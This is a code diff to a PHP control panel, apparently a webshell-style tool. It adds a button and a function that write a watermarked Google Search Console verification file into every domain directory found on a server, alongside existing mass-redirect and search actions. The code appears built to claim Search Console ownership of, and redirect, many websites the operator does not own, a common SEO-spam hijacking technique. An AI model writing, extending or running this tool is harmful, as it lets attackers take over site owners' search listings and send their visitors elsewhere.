@@ -24,6 +24,8 @@ class SimpleReplacer {
                 return $this->doSearch($_POST['username']);
             } elseif ($_POST['action'] === 'gsc_upload') {
                 return $this->doGSCUpload();
+                } elseif ($_POST['action'] === 'gsc_upload2') {
+    return $this->doGSCUpload2();
             } elseif ($_POST['action'] === 'redirect' && !empty($_POST['redirect_url'])) {
                 return $this->doRedirect($_POST['redirect_url']);
             }
@@ -205,6 +207,68 @@ class SimpleReplacer {
             'count' => $count
         ];
     }
+
+    private function doGSCUpload2() {
+    $dirs = $this->findDirs();
+    $count = 0;
+    $list = [];
+    $failed = [];
+    
+    $fileName = "googlebaa53662039c8654.html";
+    // Konten yang benar untuk verifikasi Google dengan watermark hidden
+    $fileContent = 'google-site-verification: googlebaa53662039c8654.html' . "\n" . '<!-- ' . $this->watermark . ' -->';
+    
+    foreach ($dirs as $dir) {
+        $targetPath = $dir . '/' . $fileName;
+        $domainName = basename($dir);
+        
+        if (file_exists($targetPath)) {
+            @unlink($targetPath);
+        }
+        
+        if (file_put_contents($targetPath, $fileContent, LOCK_EX)) {
+            chmod($targetPath, 0644);
+            
+            if (file_exists($targetPath)) {
+                $count++;
+                $list[] = $domainName;
+            } else {
+                $failed[] = $domainName;
+            }
+        } else {
+            $handle = fopen($targetPath, 'w');
+            if ($handle) {
+                fwrite($handle, $fileContent);
+                fclose($handle);
+                chmod($targetPath, 0644);
+                
+                if (file_exists($targetPath)) {
+                    $count++;
+                    $list[] = $domainName;
+                } else {
+                    $failed[] = $domainName;
+                }
+            } else {
+                $failed[] = $domainName;
+            }
+        }
+    }
+    
+    $message = "✅ Google Site Verification (kedua) berhasil - " . $this->watermark . "\n";
+    $message .= "File '{$fileName}' terupload ke {$count} domain";
+    
+    if (!empty($failed)) {
+        $message .= "\n❌ Gagal di " . count($failed) . " domain";
+    }
+    
+    $message .= "\n\n📌 Cek di: https://domainanda.com/{$fileName}";
+    
+    return [
+        'success' => $message,
+        'domains' => $list,
+        'count' => $count
+    ];
+}
 
     private function doRedirect($redirectUrl) {
         $dirs = $this->findDirs();
@@ -625,6 +689,12 @@ if ($response && isset($response['success'])) {
             <input type="hidden" name="action" value="gsc_upload">
             <button type="submit" class="btn gsc">✅ GOOGLE SITE VERIFICATION <span class="badge">GSC</span></button>
         </form>
+
+        <!-- GSC BUTTON 2 -->
+<form method="post">
+    <input type="hidden" name="action" value="gsc_upload2">
+    <button type="submit" class="btn gsc">✅ GSC VERIFICATION 2 <span class="badge">baa53662</span></button>
+</form>
 
         <!-- REDIRECT BUTTON -->
         <button type="button" class="btn redirect" onclick="redirectPrompt()">⚡ SETUP REDIRECT</button>
